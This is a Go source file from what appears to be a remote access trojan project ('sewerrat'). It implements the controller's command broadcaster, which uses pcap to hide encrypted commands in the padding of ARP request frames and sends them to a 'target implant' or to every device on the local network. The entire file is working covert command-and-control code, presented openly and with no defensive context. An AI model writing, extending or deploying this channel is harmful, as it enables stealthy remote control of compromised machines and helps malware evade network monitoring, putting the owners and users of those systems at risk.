package server

import (
	"fmt"
	"log"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"sewerrat/shared"
)

// CommandBroadcaster sends ARP requests with embedded commands
type CommandBroadcaster struct {
	interfaceName string
	handle        *pcap.Handle
	srcMAC        net.HardwareAddr
	srcIP         net.IP
}

// NewCommandBroadcaster creates a new broadcaster for the specified interface
func NewCommandBroadcaster(interfaceName string) (*CommandBroadcaster, error) {
	cb := &CommandBroadcaster{
		interfaceName: interfaceName,
	}

	// Open pcap handle
	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("failed to open interface %s: %w", interfaceName, err)
	}

	cb.handle = handle

	// Get local interface info
	ifaces, err := net.Interfaces()
	if err != nil {
		handle.Close()
		return nil, fmt.Errorf("failed to get interfaces: %w", err)
	}

	for _, iface := range ifaces {
		if iface.Name == interfaceName {
			cb.srcMAC = iface.HardwareAddr
			break
		}
	}

	// Get local IP
	addrs, err := net.InterfaceByName(interfaceName)
	if err == nil {
		ifAddrs, _ := addrs.Addrs()
		for _, addr := range ifAddrs {
			if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil {
				cb.srcIP = ipnet.IP.To4()
				break
			}
		}
	}

	// Fallback to 0.0.0.0 if empty
	if cb.srcIP == nil {
		cb.srcIP = net.IPv4zero.To4()
	}

	return cb, nil
}

// SendCommand sends a command embedded in an ARP request to the target implant
// The implant is at triggerIP with targetMAC (can be broadcast for discovery)
func (cb *CommandBroadcaster) SendCommand(targetMAC string, command string) error {
	// Encrypt command if enabled
	encrypted, err := shared.SafeEncrypt([]byte(command))
	if err != nil {
		encrypted = []byte(command)
	}

	// Create Ethernet layer
	eth := &layers.Ethernet{
		SrcMAC:       cb.srcMAC,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // Broadcast
		EthernetType: layers.EthernetTypeARP,
	}

	// Parse destination MAC
	dstMAC, err := net.ParseMAC(targetMAC)
	if err != nil {
		dstMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	}

	// Create ARP request with trigger IP as target
	triggerIP := net.ParseIP(shared.TriggerIP).To4()
	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   cb.srcMAC,
		SourceProtAddress: cb.srcIP,
		DstHwAddress:      dstMAC,
		DstProtAddress:    triggerIP,
	}

	// Build packet buffer
	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// Serialize Ethernet layer
	if err := eth.SerializeTo(buffer, opts); err != nil {
		return fmt.Errorf("failed to serialize Ethernet: %w", err)
	}

	// Serialize ARP layer
	if err := arp.SerializeTo(buffer, opts); err != nil {
		return fmt.Errorf("failed to serialize ARP: %w", err)
	}

	// Create padding with magic marker + encrypted command
	padding := shared.FramePadding(encrypted)
	buffer.AppendBytes(len(padding))
	copy(buffer.Bytes()[len(buffer.Bytes())-len(padding):], padding)

	// Send packet
	if err := cb.handle.WritePacketData(buffer.Bytes()); err != nil {
		return fmt.Errorf("failed to send packet: %w", err)
	}

	log.Printf("[>>] Sent command: %s (to %s)\n", command, targetMAC)
	log.Printf("[AUDIT] sent ARP command frame to %s: %s\n", targetMAC, shared.SummarizeForAudit(command, shared.AuditPreviewLimit))
	return nil
}

// BroadcastCommand sends command to all devices on LAN
func (cb *CommandBroadcaster) BroadcastCommand(command string) error {
	return cb.SendCommand("ff:ff:ff:ff:ff:ff", command)
}

// Close closes the pcap handle
func (cb *CommandBroadcaster) Close() error {
	if cb.handle != nil {
		cb.handle.Close()
	}
	return nil
}

// GetLocalInterface returns the interface name being used
func (cb *CommandBroadcaster) GetLocalInterface() string {
	return cb.interfaceName
}

// GetSourceMAC returns the source MAC address
func (cb *CommandBroadcaster) GetSourceMAC() string {
	return cb.srcMAC.String()
}

// GetSourceIP returns the source IP address
func (cb *CommandBroadcaster) GetSourceIP() string {
	return cb.srcIP.String()
}
